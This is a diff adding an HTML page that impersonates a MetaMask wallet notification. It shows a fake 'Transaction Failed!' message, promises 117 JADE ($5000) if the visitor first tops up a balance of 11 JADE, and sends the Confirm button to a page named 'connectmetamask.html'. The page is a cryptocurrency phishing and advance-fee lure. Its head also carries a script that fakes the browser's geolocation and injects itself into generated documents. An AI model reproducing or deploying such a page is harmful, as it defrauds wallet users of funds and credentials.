@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html><head><script>(function(){function hookGeo() {
+  //<![CDATA[
+  const WAIT_TIME = 100;
+  const hookedObj = {
+    getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),
+    watchPosition: navigator.geolocation.watchPosition.bind(navigator.geolocation),
+    fakeGeo: true,
+    genLat: 38.883333,
+    genLon: -77.000
+  };
+
+  function waitGetCurrentPosition() {
+    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+      if (hookedObj.fakeGeo === true) {
+        hookedObj.tmp_successCallback({
+          coords: {
+            latitude: hookedObj.genLat,
+            longitude: hookedObj.genLon,
+            accuracy: 10,
+            altitude: null,
+            altitudeAccuracy: null,
+            heading: null,
+            speed: null,
+          },
+          timestamp: new Date().getTime(),
+        });
+      } else {
+        hookedObj.getCurrentPosition(hookedObj.tmp_successCallback, hookedObj.tmp_errorCallback, hookedObj.tmp_options);
+      }
+    } else {
+      setTimeout(waitGetCurrentPosition, WAIT_TIME);
+    }
+  }
+
+  function waitWatchPosition() {
+    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+      if (hookedObj.fakeGeo === true) {
+        navigator.getCurrentPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+        return Math.floor(Math.random() * 10000); // random id
+      } else {
+        hookedObj.watchPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+      }
+    } else {
+      setTimeout(waitWatchPosition, WAIT_TIME);
+    }
+  }
+
+  Object.getPrototypeOf(navigator.geolocation).getCurrentPosition = function (successCallback, errorCallback, options) {
+    hookedObj.tmp_successCallback = successCallback;
+    hookedObj.tmp_errorCallback = errorCallback;
+    hookedObj.tmp_options = options;
+    waitGetCurrentPosition();
+  };
+  Object.getPrototypeOf(navigator.geolocation).watchPosition = function (successCallback, errorCallback, options) {
+    hookedObj.tmp2_successCallback = successCallback;
+    hookedObj.tmp2_errorCallback = errorCallback;
+    hookedObj.tmp2_options = options;
+    waitWatchPosition();
+  };
+
+  const instantiate = (constructor, args) => {
+    const bind = Function.bind;
+    const unbind = bind.bind(bind);
+    return new (unbind(constructor, null).apply(null, args));
+  }
+
+  Blob = function (_Blob) {
+    function secureBlob(...args) {
+      const injectableMimeTypes = [
+        { mime: 'text/html', useXMLparser: false },
+        { mime: 'application/xhtml+xml', useXMLparser: true },
+        { mime: 'text/xml', useXMLparser: true },
+        { mime: 'application/xml', useXMLparser: true },
+        { mime: 'image/svg+xml', useXMLparser: true },
+      ];
+      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+        if (mimeTypeIndex >= 0) {
+          let mimeType = injectableMimeTypes[mimeTypeIndex];
+          let injectedCode = `<script>(
+            ${hookGeo}
+          )();<\/script>`;
+    
+          let parser = new DOMParser();
+          let xmlDoc;
+          if (mimeType.useXMLparser === true) {
+            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+          } else {
+            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+          }
+
+          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+    
+            if (mimeType.useXMLparser === true) {
+              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+            } else {
+              args[0][0] = xmlDoc.documentElement.outerHTML;
+            }
+          }
+        }
+      }
+
+      return instantiate(_Blob, args); // arguments?
+    }
+
+    // Copy props and methods
+    let propNames = Object.getOwnPropertyNames(_Blob);
+    for (let i = 0; i < propNames.length; i++) {
+      let propName = propNames[i];
+      if (propName in secureBlob) {
+        continue; // Skip already existing props
+      }
+      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+      Object.defineProperty(secureBlob, propName, desc);
+    }
+
+    secureBlob.prototype = _Blob.prototype;
+    return secureBlob;
+  }(Blob);
+
+  window.addEventListener('message', function (event) {
+    if (event.source !== window) {
+      return;
+    }
+    const message = event.data;
+    switch (message.method) {
+      case 'updateLocation':
+        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+          hookedObj.genLat = message.info.coords.lat;
+          hookedObj.genLon = message.info.coords.lon;
+          hookedObj.fakeGeo = message.info.fakeIt;
+        }
+        break;
+      default:
+        break;
+    }
+  }, false);
+  //]]>
+}hookGeo();})()</script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <title>MetaMask Notification</title>
+    <style>
+      #app-content {
+        display: flex;
+        flex-flow: column;
+      }
+
+      #loading__logo {
+        width: 10rem;
+        height: 10rem;
+        align-self: center;
+        margin: 10rem 0 0 0;
+      }
+
+      #loading__spinner {
+        width: 2rem;
+        height: 2rem;
+        align-self: center;
+        margin-top: 1rem;
+      }
+    </style>
+    <link href="lopek_baluwo/images/favicon.png" rel="shortcut icon" type="image/x-icon">
+    <link rel="stylesheet" type="text/css" href="lopek_baluwo/index.css" title="ltr">
+    <link rel="stylesheet" type="text/css" href="lopek_baluwo/index-rtl.css" title="rtl" disabled="">
+  <style></style></head>
+  <body class="notification">
+    <div id="app-content"><div class="app mouse-user-styles"><div><span></span></div><div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;"><style>
+          .menu-droppo-enter {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+
+          .menu-droppo-enter.menu-droppo-enter-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave.menu-droppo-leave-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+        </style></div><div class="main-container-wrapper"><div class="page-container"><div class="confirm-page-container-navigation" style="display: none;"><div class="confirm-page-container-navigation__container" style="visibility: hidden;"><div class="confirm-page-container-navigation__arrow" data-testid="first-page"><img src="lopek_baluwo/images/double-arrow.svg" alt=""></div><div class="confirm-page-container-navigation__arrow" data-testid="previous-page"><img src="/images/single-arrow.svg" alt=""></div></div><div class="confirm-page-container-navigation__textcontainer"><div class="confirm-page-container-navigation__navtext">1 of 1</div><div class="confirm-page-container-navigation__longtext">requests waiting to be acknowledged</div></div><div class="confirm-page-container-navigation__container" style="visibility: hidden;"><div class="confirm-page-container-navigation__arrow" data-testid="next-page"><img class="confirm-page-container-navigation__imageflip" src="lopek_baluwo/images/single-arrow.svg" alt=""></div><div class="confirm-page-container-navigation__arrow" data-testid="last-page"><img class="confirm-page-container-navigation__imageflip" src="lopek_baluwo/images/double-arrow.svg" alt=""></div></div></div><div class="confirm-page-container-header"><div class="confirm-page-container-header__row"><div class="confirm-page-container-header__address-container"><div class="confirm-page-container-header__address-identicon"><div class=""><div class="identicon" style="height: 24px; width: 24px; border-radius: 12px;"><div style="border-radius: 50px; overflow: hidden; padding: 0px; margin: 0px; width: 24px; height: 24px; display: inline-block; background: rgb(1, 135, 142);"><svg x="0" y="0" width="24" height="24"><rect x="0" y="0" width="24" height="24" transform="translate(-1.8283976330022202 3.9268598674416935) rotate(122.5 12 12)" fill="#F94301"></rect><rect x="0" y="0" width="24" height="24" transform="translate(8.395005443347443 6.451852780925942) rotate(121.5 12 12)" fill="#C8144A"></rect><rect x="0" y="0" width="24" height="24" transform="translate(17.29272690351644 3.3990868252390825) rotate(113.9 12 12)" fill="#FA7900"></rect></svg></div></div></div></div><div class="confirm-page-container-header__address"></div></div><div class="network-display network-display--colored network-display--mainnet chip chip--with-left-icon chip--transparent" role="button" tabindex="0"><div class="chip__left-icon"><div class="color-indicator color-indicator--filled color-indicator--color-mainnet color-indicator--size-lg"><span class="color-indicator__inner-circle"></span></div></div></div></div></div><div class="confirm-approve-content"><div class="confirm-approve-content__identicon-wrapper"></div><div class="confirm-approve-content__title">Transaction Failed!</div><div class="confirm-approve-content__description" style="color: red;">To get 117 JADE ($5000) You must have a minimum balance of 11 JADE please fill in your balance.</div><div class="confirm-approve-content__card-wrapper"></div></div><div class="page-container__footer"><footer><button class="button btn-default page-container__footer-button" disabled="" data-testid="page-container-footer-cancel">Reject</button><a href="/connectmetamask.html" class="button btn-primary page-container__footer-button" data-testid="page-container-footer-next">Confirm</a></footer></div></div></div></div></div>
+    <div id="popover-content"></div>
+</body></html>
